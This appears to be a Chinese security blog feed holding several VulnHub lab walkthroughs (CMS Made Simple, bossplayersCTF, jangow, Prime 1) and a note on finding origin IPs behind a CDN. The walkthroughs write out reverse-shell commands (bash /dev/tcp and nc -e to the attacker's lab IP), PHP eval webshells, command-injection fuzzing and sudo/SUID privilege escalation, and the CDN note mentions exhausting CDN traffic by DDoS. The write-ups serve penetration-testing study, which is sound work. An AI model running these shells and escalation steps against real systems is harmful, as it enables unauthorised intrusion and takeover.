</span><br></pre></td></tr></table></figure><p>看以看到，只有一个用户admin，账号密码都出来了</p><p>密码盲猜md5加密，于是拿去解密了一波，没解出来</p><p><img src="/img/1670220854003-18830cbf-a575-48e8-b3e0-66eee9a3a474.png" alt="img"></p><h2 id="加密类型"><a href="#加密类型" class="headerlink" title="加密类型"></a>加密类型</h2><p>现在问题来了，有两条路：</p><ol><li>解出这个密码，直接登录</li><li>改密码，再登录</li></ol><p>不管是哪一种，最终都是要知道这个密码的加密方式才行</p><p>这里给出两种方式</p><h3 id="CMS文档"><a href="#CMS文档" class="headerlink" title="CMS文档"></a>CMS文档</h3><p>直接上网搜，因为这是个CMS，可能会有他们的帮助文档（或者其他人遇到过这个问题，解决了之后写博客发到网上），看能不能找到突破</p><blockquote><p> <strong>小提示：</strong></p><p><strong>如果是国人开发的CMS，首选用中文搜索；外国人开发的CMS首选英文搜索</strong></p><p>这很重要！！！因为我最开始用中文根本没搜到</p></blockquote><img src="/img/1670221468587-2f29b360-d9cd-409d-8569-dbff382fcc4a.png" alt="img" style="zoom:50%;" /><p>这里给出链接</p><p><a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">CMS Made Simple Admin password recovery : : CMS Made Simple - Tutorials, Tips and Tricks - CMSMS</a></p><p>里面给出了三种重置密码的方法，这里我们主要关注数据库这条</p><p><img src="/img/1670221574024-3d8ce9dc-0e88-4b7f-9663-4e5ad299ed12.png" alt="img"></p><p>照着这个教程把密码改成<code>123456</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;123456&#x27;))) where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>这里给出另一种思路：代码审计</p><p>因为这是个开源的CMS，源码我们是可以下载到的，我们就可以直接下载下来，去看源码，找出密码的加密方式。</p><p>我个人代码审计比较菜，没有用这种方法。其实难度不高，B站有大佬的讲解视频用的就是这种方法，感兴趣可以去看看，id叫大福。</p><h1 id="Web后台"><a href="#Web后台" class="headerlink" title="Web后台"></a>Web后台</h1><p>之前目录扫描扫出来的<code>admin/</code>，进去之后，直接跳转到<code>admin/login.php</code>，在这里输入账号密码登录</p><p><img src="/img/1670222025602-29b137d7-af7f-4c13-bde2-190eb36d67bb.png" alt="img"></p><p>看以看到，成功登录后台了</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="用户自定义标签"><a href="#用户自定义标签" class="headerlink" title="用户自定义标签"></a>用户自定义标签</h2><p>发现左边标签栏有个<code>Extensions</code>，这引起了我的注意，因为之前在打一个靶机的时候，拿到WordPress的一个后台，最后也是通过扩展</p><p><img src="/img/1670222978330-ddff5efd-0597-487a-90bd-8ee2b07e36f9.png" alt="img"></p><p>这里是有php的RCE的，我们可以把里面的代码删了换成我们自己的。用php执行反弹shell就行，方法很多，可以直接生成一个php反弹shell的代码，也可以直接用php函数调用系统命令</p><p>我这里用php调用系统命令，用bash反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;bash -c &#x27;bash -i&gt;&amp; /dev/tcp/192.168.56.101/6666 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure><p>监听端口——&gt; Submit提交 —-&gt; Run执行</p><p><img src="/img/1670223600449-f74c66c7-4500-4e7d-8d41-afd485ee597d.png" alt="img"></p><p>再来看看Kali这边，成功反弹Shell，拿到的是www权限</p><p><img src="/img/1670223695641-dcc4f8f9-8127-4198-9c74-16cdefe6cd3d.png" alt="img"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>尝试了内核提权，suid提权都无果</p><p>于是翻起了文件，看看有没有什么敏感文件，备份文件啥的</p><p>我个人很喜欢上传一个一句话木马，然后用蚁剑连上去，直接图形化找文件，不过这里没有权限创建</p><p>最终在<code>/var/www/html/admin</code>下面发现一个隐藏文件<code>.htpasswd</code></p><p><img src="/img/1670225573961-d84bae10-abf6-49f6-9e63-6418c825df93.png" alt="img"></p><h2 id="htpasswd"><a href="#htpasswd" class="headerlink" title=".htpasswd"></a>.htpasswd</h2><p>查看一下，得到一串字符串，感觉是base64（两个等号）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base64</span>解密</span></span><br><span class="line">MFZG233VOI5FG2DJMVWGIQBRGIZQ====</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">base32</span>解码</span></span><br><span class="line">armour:Shield@123</span><br></pre></td></tr></table></figure><p>为什么后面选择用base32而不是base64？</p><p>凭经验猜，但首先你得了解一下常用的加密、编码方式有哪些特征</p><ul><li>Base16：结尾没有等号，数字要多于字母；</li><li>Base32：字母要多于数字，明文数量超过10个，结尾可能会有很多等号；</li><li>Base58：结尾没有等号，字母要多于数字；</li><li>Base64：一般情况下结尾都会有1个或者2个等号，明文很少的时候可能没有；</li><li>Base85：等号一般出现在字符串中间，含有一些奇怪的字符；</li><li>Base100：密文由 Emoji 表情组成。</li></ul><p>知道了上面这些特征，你就能大概看出最符合的就是base32了</p><h2 id="切换到armour"><a href="#切换到armour" class="headerlink" title="切换到armour"></a>切换到armour</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -u armour</span><br></pre></td></tr></table></figure><p><code>sudo -l</code>查看armour用户有没有可以执行的sudo命令</p><p><img src="/img/1670230053105-3c61f64d-657a-4dec-b7da-537ecdcce28a.png" alt="img"></p><p>发现不用密码就可以执行python，这不直接用python提权？</p><h2 id="python提权"><a href="#python提权" class="headerlink" title="python提权"></a>python提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>成功提权，拿到flag</p><img src="/img/1670230199937-c86bb35c-36d3-46f8-8345-1e3107f0aba7.png" alt="img" style="zoom:67%;" /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h2><p>拿到IP之后，对端口进行扫描，发现22，80，3306端口</p><p>80的web页面没有进展，转战3306，通过弱口令拿下数据库</p><p>通过mysql操作，修改admin密码（其中主要的是：理清密码的加密方式）</p><p>用修改过的admin账号登录web管理后台，拓展那里可以执行php代码</p><p>写入反弹shell代码，监听，执行，拿到shell</p><p>通过隐藏文件解密<code>.htpasswd</code>，拿到armour用户的账号密码，切换到该用户</p><p>发现该用户可以不使用密码运行python，用python提权成功，拿到flag</p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>重温了一波mysql的命令行操作，很多不熟练，还得再练练，毕竟以后实战环境没有图形化的界面给我操控mysql</li><li>CMS往往有类似于“插件”、“扩展”之类的功能，一般支持自定义，可以上传代码片段，容易拿SHELL</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】bossplayerCTF攻略</title>
      <link href="/bossplayer-ctf-walkthrough/"/>
      <url>/bossplayer-ctf-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>1、下载虚拟机<br><a href="https://www.vulnhub.com/entry/bossplayersctf-1%2C375/">虚拟机地址</a><br>2、打开虚拟机<br>直接双击ova文件，选择打开方式为VirtualBox即可<br>3、开机，到这个页面就行了<br><img src="/img/image-20221129200026339.png" alt="image-20221129200026339"></p><p>现在可以开始渗透了~</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="靶机IP"><a href="#靶机IP" class="headerlink" title="靶机IP"></a>靶机IP</h2><p>用nmap扫描整个C段，拿到靶机IP（我的网段是192.168.56.x）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span>.<span class="number">56.1</span>/<span class="number">24</span>        </span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200047187.png" alt="image-20221129200047187"><br>扫出三个IP（192.168.56.1是我物理机)<br><strong>Kali：192.168.56.101靶机：192.168.56.102</strong></p><h2 id="访问Web"><a href="#访问Web" class="headerlink" title="访问Web"></a>访问Web</h2><p>靶机开放了80端口，我们访问一下<br><img src="/img/image-20221129200106819.png" alt="image-20221129200106819"><br>就是些靶机作者写的靶机介绍，没啥提示性的信息<br>然后我查看了前端源码，没发现什么。页面上也没有可以点的链接<br>所以接下来尝试目录扫描</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">56.102</span>/</span><br><span class="line"></span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.102</span>/ <span class="literal">----</span></span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/index.html (CODE:<span class="number">200</span>|SIZE:<span class="number">575</span>)                                                                                                   </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/robots.txt (CODE:<span class="number">200</span>|SIZE:<span class="number">53</span>)                                                                                                    </span><br><span class="line">+ http://<span class="number">192.168</span>.<span class="number">56.102</span>/server<span class="literal">-status</span> (CODE:<span class="number">403</span>|SIZE:<span class="number">302</span>)</span><br></pre></td></tr></table></figure><p>逐一访问上述三个地址</p><ul><li>index.html：就是上面那个刚打开的网页</li><li>robots.txt：出现了下面的文本</li></ul><blockquote><p>super secret password - bG9sIHRyeSBoYXJkZXIgYnJvCg&#x3D;&#x3D;</p></blockquote><ul><li>server-status：提示403Forbidden</li></ul><p>所以这一步的关键就在于<code>robots.txt</code>了，接下来我们对拿到的字符进行base64解码（一看第一感觉是base64）</p><blockquote><p>lol try harder bro</p></blockquote><p>被作者嘲笑了。。。<br>找啊找，这靶机作者真的阴啊！在首页源码下面写了一行注释，因为代码只有12行，却把提示信息写到121行，差点就放过去了！拿到一串字符串</p><blockquote><p>WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK</p></blockquote><p>一眼看不知道是啥加密或者编码，我就先试了base64，解出来个这个</p><blockquote><p>ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K</p></blockquote><p>这一看还是编码，而且没有乱码，长度也明显缩短了，所以这很可能是套娃base64，所以接着解密，直到解出来为止</p><blockquote><p>d29ya2luZ2lucHJvZ3Jlc3MucGhwCg&#x3D;&#x3D;</p></blockquote><p>这里以及看出来了，很明显的base64编码特征，再解密：</p><blockquote><p>workinginprogress.php</p></blockquote><p>我们得到了一个php，拼接访问一下</p><h2 id="workinginprogress-php"><a href="#workinginprogress-php" class="headerlink" title="workinginprogress.php"></a>workinginprogress.php</h2><p><img src="/img/image-20221129200131253.png" alt="image-20221129200131253"><br>看这个样子，应该是要Fuzz参数，看他写的Test ping command，感觉可以命令执行，所以写了个命令去Fuzz</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz <span class="literal">-w</span> /usr/share/wfuzz/wordlist/general/common.txt http://<span class="number">192.168</span>.<span class="number">56.102</span>/workinginprogress.php?FUZZ=whoami</span><br></pre></td></tr></table></figure><p>发现<code>cmd</code>这个参数和其他的不一样<br><img src="/img/image-20221129200148707.png" alt="image-20221129200148707"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>浏览器访问一下，有东西，直接RCE（怎么感觉初级基本都这样，直接RCE，这是我打的第二个初级vulnhub靶机，第一个是jangow，那个的RCE比这个还直接）<br><img src="/img/image-20221129200202831.png" alt="image-20221129200202831"><br>我一般喜欢一句话木马和反弹shell双管齐下。一句话木马连上之后，可视化的传文件看文件啥的方便很多，反弹shell到msf，后续使用msf的模块比较方便。<br>这里记录一下路径，方便连webshell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span>/var/www/html</span><br><span class="line"><span class="built_in">echo</span><span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑发现连不上，ls一看，根本就没写进去，尝试新建文件，ls之后发现也没有新建成功，那就只能试试</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kali监听4130端口</span></span><br><span class="line">nc <span class="literal">-lvvp</span> <span class="number">4130</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">workinginprogress.php?cmd=nc <span class="number">192.168</span>.<span class="number">56.101</span> <span class="number">4130</span> <span class="literal">-e</span>/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用交互式命令行</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; uname <span class="literal">-a</span></span><br><span class="line">Linux bossplayers <span class="number">4.19</span>.<span class="number">0</span><span class="literal">-6-amd64</span> <span class="comment">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">&gt; searchsploit debian <span class="number">4.19</span></span><br><span class="line">Exploits: No Results</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>可以看到，内核提权g了</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>之前总结的提权：<a href="https://www.yuque.com/jen413/neiwang/manzoaybnusi9tvo">提权方式</a><br>里面有写到suid提权，这是第一次suid提权实战！<br><strong>① 查找具有suid权限的命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">/usr/lib/eject/dmcrypt<span class="literal">-get-device</span></span><br></pre></td></tr></table></figure><p>② 这里我们选在 find 提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . <span class="literal">-exec</span> /bin/bash <span class="literal">-p</span> \;</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129200221596.png" alt="image-20221129200221596"><br>可以看到提权成功了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、切换到root目录下</span></span><br><span class="line">cd /root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、查看目录下文件</span></span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、查看root.txt</span></span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p>root.txt的内容</p><blockquote><p>Y29uZ3JhdHVsYXRpb25zCg&#x3D;&#x3D;<br>解密之后：congratulations</p></blockquote><p>Done！！！完成啦！</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】jangow1.0.1攻略</title>
      <link href="/jangow-1.0.1-walkthrough/"/>
      <url>/jangow-1.0.1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ul><li><a href="https://www.vulnhub.com/entry/jangow-101,754/">下载靶机</a></li><li>导入虚拟机（<strong>！！！推荐VirtualBox导入</strong>）</li><li>开机</li><li>得到ip</li></ul><h1 id="【issue】开机没有IP"><a href="#【issue】开机没有IP" class="headerlink" title="【issue】开机没有IP"></a>【issue】开机没有IP</h1><p>正常在开机的时候，<code>REDE</code>后面就会有IP，但是我这里没有显示。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>如果你跟我一样，不想下载VirtualBox而使用的是VMWare导入靶机，这里<strong>推荐用VirtualBox</strong>，我下了导入VB，直接解决问题，建议还是下一个哈，Vulnhub里面很多靶机都是ova的，用VB打开会更好。<br>如果你还是不想下，那这里给出我找的教程（比上面复杂，反正我是跟着弄了好一会没成功就放弃了）</p><ul><li><a href="https://www.yuque.com/summerdon/cpubfz/ux121k">Vulnhub靶机检测不到IP-语雀</a></li><li><a href="https://blog.csdn.net/qq_41918771/article/details/103636890">Vulnhub靶机检测不到IP地址_Vicl1fe的博客-CSDN博客</a></li></ul><h1 id="【issue】VM和VB互通问题"><a href="#【issue】VM和VB互通问题" class="headerlink" title="【issue】VM和VB互通问题"></a>【issue】VM和VB互通问题</h1><p>如果你按照上面的解决方案，解决了VMWare导入虚拟机没有IP的问题，那你可以直接忽略这一步，直接开始。<br>此issue针对靶机在VirtualBox，而Kali依旧在VMWare中。这种情况下，由于VM和VB的虚拟网卡不在同一网段，也就是说Kali和靶机之间是不通的。解决方法参考以下博客</p><ul><li><a href="https://blog.csdn.net/qq_43342566/article/details/102679837">如何在vmware上访问virtualbox的虚拟机</a></li></ul><h1 id="拿到IP"><a href="#拿到IP" class="headerlink" title="拿到IP"></a>拿到IP</h1><p>一开机，直接就显示了<br><img src="/img/image-20221129185113854.png" alt="image-20221129185113854"><br>这里我用了两台攻击机：VMWare里面的Kali以及我的本机win10（哪个方便用哪个)</p><ul><li>靶机：192.168.56.118</li><li>Kali：192.168.56.</li><li>win10：192.168.56.1</li></ul><h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCTV 192.168.56.118 &gt; jangow.txt</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221129190507571.png" alt="image-20221129190507571"><br>扫出了一个21端口和80端口</p><h1 id="访问Web服务"><a href="#访问Web服务" class="headerlink" title="访问Web服务"></a>访问Web服务</h1><ul><li>用HTTP访问上面扫出的80端口</li></ul><p><img src="/img/image-20221129185311777.png" alt="image-20221129185311777"></p><ul><li>进入<code>site</code></li></ul><p><img src="/img/image-20221129185325813.png" alt="image-20221129185325813"><br>随便看了看网页的功能点</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><ul><li>点击<code>Buscar</code>，直接跳出个空白页面，参数也没有</li></ul><p><img src="/img/image-20221129185339955.png" alt="image-20221129185339955"></p><ul><li>输入个<code>whoami</code>，好家伙，直接RCE了</li></ul><p><img src="/img/image-20221129185357889.png" alt="image-20221129185357889"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ul><li>直接写入一句话木马</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;&#x27; &gt;&gt; getshell.php</span><br></pre></td></tr></table></figure><ul><li>用蚁剑连上webshell</li><li>蚁剑打开一个虚拟终端，查看系统版本</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><ul><li>searchsploit找提权脚本，上传到靶机</li></ul><p><img src="/img/image-20221129185413327.png" alt="image-20221129185413327"></p><ul><li>编译，给权限，执行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod 777 45010</span><br><span class="line">./45010</span><br></pre></td></tr></table></figure><p>一顿操作之后，虚拟终端一点反应都没有<br><img src="/img/image-20221129185429675.png" alt="image-20221129185429675"><br>于是上网看看大家的操作<br>用反弹shell，和上面一样的步骤，最后提权成功了<br><img src="/img/image-20221129185446656.png" alt="image-20221129185446656"><br>这可能就是蚁剑那个虚拟终端的问题了，至此，我们已经拿到靶机的root权限了</p><h1 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h1><p>vulnhub里面的靶机，最后的flag基本在<code>/root</code>目录下，切过去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现一个proof.txt，打开看看</span></span><br><span class="line">cat proof.txt</span><br></pre></td></tr></table></figure><p>ok!成功拿到flag<br><img src="/img/image-20221129185459966.png" alt="image-20221129185459966"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整体流程比较简单，80页面直接就给了个RCE真的骚<br>过程中还是遇到不少问题，比如</p><ul><li>反弹shell有很多种方式，到底用哪种？这是我不会的地方</li><li>蚁剑的虚拟终端，执行命令会出莫名其妙的问题</li><li>还有反弹shell那块，其实只有443端口是可以出的，其他的都会失败</li></ul><p>感觉那个443出网端口，可能作者并不想我们来反弹shell？</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN介绍及绕过</title>
      <link href="/cdn-introduction-and-bypass/"/>
      <url>/cdn-introduction-and-bypass/</url>
      
        <content type="html"><![CDATA[<p>CDN的全称Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><p><img src="/img/1668482100398-78088975-42bd-491a-a5cf-79f6ce107939.png" alt="img"></p><h1 id="如何判断目标存在CDN服务"><a href="#如何判断目标存在CDN服务" class="headerlink" title="如何判断目标存在CDN服务?"></a>如何判断目标存在CDN服务?</h1><p><strong>– 多地ping</strong></p><ul><li><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></li><li><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></li></ul><p><strong>– 原理</strong></p><p>利用不通地区对网站进行ping，获取网站的IP地址</p><p>如果加了CDN，<strong>不同地区获取到的IP地址不一样</strong>（CDN服务器不是同一台）</p><h1 id="CDN对安全测试有什么影响"><a href="#CDN对安全测试有什么影响" class="headerlink" title="CDN对安全测试有什么影响?"></a>CDN对安全测试有什么影响?</h1><p>CDN会隐藏服务器真实的IP地址，无法对目标网站的操作系统进行渗透</p><p>CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态CDN加速），拥有相同的网站架构，且CDN服务器可与站点服务器进行交互，因此SQL注入，XSS等漏洞的挖掘并不受太大影响。</p><h1 id="常见CDN绕过方法"><a href="#常见CDN绕过方法" class="headerlink" title="常见CDN绕过方法"></a>常见CDN绕过方法</h1><p><strong>1、子域名IP查询</strong></p><p>CDN要钱，为了节约成本，可能流量小的子站没有做CDN</p><p>但是子站可能和主站不在同一个服务器上！查出来的不一定就是主站的IP</p><p><strong>2、邮箱服务查询</strong></p><p>很多公司内部都有邮件服务器，大部分不会做CDN</p><p>他给你发邮件（反向），不会走CDN。根据他发送的邮件，得到他的IP</p><p><strong>3、外地址请求</strong></p><p>有些公司的业务主要在国内，对国内地区做了CDN，但是国外没有，用国外IP去请求，可能会得到真实IP</p><p><strong>4、遗留文件</strong></p><p>泄露了phpinfo.php会导致IP泄露</p><p><strong>5、网络空间搜索引擎</strong></p><p>fofa、shodan、谛听、zoomeye、censys</p><p>搜索特定文件</p><p><strong>6、DNS解析记录</strong></p><p>之前可能未套CDN，看看之前解析到哪个IP，很有可能是真是IP</p><p><strong>7、以量打量</strong></p><p>用DDOS打光网站CDN的流量（很刑!!!），之后就能拿到真是IP</p><h1 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h1><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h1 id="Extend"><a href="#Extend" class="headerlink" title="Extend"></a>Extend</h1><h2 id="CDN和负载均衡"><a href="#CDN和负载均衡" class="headerlink" title="CDN和负载均衡"></a>CDN和负载均衡</h2><p>CDN只缓存静态文件，比如HTML，CSS，图片，JS等等</p><p>负载均衡相当于另一个克隆服务器，费用较高</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【vulnhub】Prime1攻略</title>
      <link href="/prime-1-walkthrough/"/>
      <url>/prime-1-walkthrough/</url>
      
        <content type="html"><![CDATA[<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p><a href="https://www.vulnhub.com/entry/prime-1,358/">Prime: 1 ~ VulnHub</a></p><h1 id="找靶机IP"><a href="#找靶机IP" class="headerlink" title="找靶机IP"></a>找靶机IP</h1><h2 id="通过Guest确定IP"><a href="#通过Guest确定IP" class="headerlink" title="通过Guest确定IP"></a>通过Guest确定IP</h2><p>最下面，有个Guest用户可以登录进去</p><p><img src="/img/image-20221105143451128.png" alt="image-20221105143451128"></p><p>右键，Open Terminal打开终端窗口</p><p><img src="/img/image-20221103140616028.png" alt="image-20221103140616028"></p><p>直接执行ifconfig，哎~这IP不就拿到了吗？</p><p><img src="/img/image-20221103140855419.png" alt="image-20221103140855419"></p><h2 id="通过扫描确定IP"><a href="#通过扫描确定IP" class="headerlink" title="通过扫描确定IP"></a>通过扫描确定IP</h2><blockquote><p>这是在B站听无涯老师的课程看到的方法</p><p>不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维</p></blockquote><p><strong>用Nmap扫描C段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.120.1/24</span><br></pre></td></tr></table></figure><p><img src="/img/image-20221103141649097.png" 